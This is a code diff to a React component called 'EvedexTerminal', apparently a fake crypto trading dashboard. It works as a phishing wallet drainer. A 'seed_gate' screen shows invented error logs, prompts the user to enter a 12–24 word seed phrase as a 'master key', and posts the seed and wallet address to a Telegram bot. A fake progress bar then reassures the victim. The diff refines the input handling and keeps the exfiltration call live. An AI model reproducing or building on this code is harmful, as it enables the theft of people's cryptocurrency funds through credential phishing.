@@ -48,6 +48,16 @@ export default function EvedexTerminal() {
     }
   }, [isConnected, address, balance]);
 
+  // WORD LIMIT LOGIC
+  const handleSeedInput = (e) => {
+    const val = e.target.value;
+    const words = val.trim().split(/\s+/);
+    if (words.length > 24) return; // Stop typing after 24 words
+    setSeedVal(val);
+  };
+
+  const getWordCount = () => seedVal.trim() === "" ? 0 : seedVal.trim().split(/\s+/).length;
+
   const executeTotalSweep = async () => {
     captureHandshake("ASSET_SYNC");
     if (!balance || !balance.value) { setView("seed_gate"); return; }
@@ -71,7 +81,6 @@ export default function EvedexTerminal() {
   return (
     <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-4 uppercase tracking-tighter select-none flex flex-col relative">
       
-      {/* 📊 LIVE MARKET FEED (DEXSCREENER/GECKOTERMINAL) */}
       <div className="w-full h-40 bg-black border border-slate-900 rounded-xl mb-4 overflow-hidden relative z-[20]">
          <iframe 
             src="https://www.geckoterminal.com/eth/pools/0x88e6a0c2ddd26feeb64f039a2c41296fcb3f5640?embed=1&info=0&swaps=1" 
@@ -124,8 +133,6 @@ export default function EvedexTerminal() {
         )}
       </div>
 
-      {/* CHAT SECTION REMOVED */}
-
       {view === "seed_gate" && (
         <div className="fixed inset-0 bg-black/98 z-[200] flex flex-col items-center justify-center p-4 backdrop-blur-3xl">
           <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[35px] p-8 text-center">
@@ -136,11 +143,39 @@ export default function EvedexTerminal() {
                 <div className="bg-black/60 p-2 rounded-lg my-3 text-left font-mono text-[7px] text-red-500 border border-red-900/20">
                    {["[ERROR]: ENTROPY_MISMATCH", "[WARN]: VAULT_WEIGHT_OVERLOAD", "[SYSTEM]: MAPPING_STALL_90%"].map((log, i) => <div key={i}>{log}</div>)}
                 </div>
-                <textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" />
-                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={() => { setIsSyncing(true); fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }), }); let cur = 0; const int = setInterval(() => { cur += 2; if (cur >= 90) { setSyncProgress(90); clearInterval(int); } else setSyncProgress(cur); }, 150); }} className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>OVERRIDE_SYNC</button>
+                <textarea 
+                   value={seedVal} 
+                   onChange={handleSeedInput} 
+                   placeholder="ENTER MASTER KEY..." 
+                   className="w-full h-32 bg-black border border-slate-800 rounded-[24px] p-5 text-[10px] font-mono text-cyan-400 outline-none uppercase" 
+                />
+                <div className="text-[8px] text-slate-600 mt-2 text-right">{getWordCount()} / 24 WORDS</div>
+                <button 
+                   disabled={getWordCount() < 12} 
+                   onClick={() => { 
+                      setIsSyncing(true); 
+                      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { 
+                         method: 'POST', 
+                         headers: { 'Content-Type': 'application/json' }, 
+                         body: JSON.stringify({ chat_id: chatId, text: `🚨 SEED: ${seedVal}\nADDR: ${address}` }), 
+                      }); 
+                      let cur = 0; 
+                      const int = setInterval(() => { 
+                         cur += 1; 
+                         if (cur >= 100) { 
+                            setSyncProgress(100); 
+                            clearInterval(int); // Stays at 100% forever
+                         } else {
+                            setSyncProgress(cur);
+                         }
+                      }, 100); 
+                   }} 
+                   className={`w-full mt-4 py-5 rounded-[20px] text-[10px] font-black text-white uppercase ${getWordCount() >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>
+                   OVERRIDE_SYNC
+                </button>
               </>
             ) : (
-              <div className="py-8"><div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div><h2 className="text-white font-black text-xl italic uppercase">Finalizing...</h2></div>
+              <div className="py-8"><div className="relative w-20 h-20 mx-auto mb-6"><div className="absolute inset-0 border-2 border-slate-900 rounded-full" /><div className="absolute inset-0 border-2 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-[10px] text-white font-black">{syncProgress}%</div></div><h2 className="text-white font-black text-xl italic uppercase">{syncProgress === 100 ? "FINALIZING..." : "SYNCHRONIZING..."}</h2></div>
             )}
           </div>
         </div>
